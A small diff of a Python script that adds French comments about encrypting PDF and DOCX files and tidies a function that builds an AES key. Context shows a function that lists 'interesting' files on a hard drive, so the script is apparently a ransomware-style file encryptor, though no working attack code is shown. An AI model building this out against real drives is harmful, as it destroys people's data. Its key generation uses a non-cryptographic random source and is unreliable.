@@ -9,7 +9,9 @@ from Crypto.Util.Padding import pad, unpad
 #import Crypto.Cipher
 import random
 import Interistinf_Files2
+#Import pour chiffrer PDF
 import pikepdf
+#Import pour chiffrer les DOCX
 import aspose.words as aw
 
 """
@@ -46,9 +48,11 @@ def list_all_interisting_files(harddrive):
     print(files)
 """
 
-def random_char(y):
-       return ''.join(random.choice(string.ascii_letters) for x in range(y))
 
+def random_char(y):
+    #Creation de la clé de chiffrement
+    return ''.join(random.choice(string.ascii_letters) for x in range(y))
+        
 def generate_aes_key():
     #generate random string of 16
     key = random_char(16)
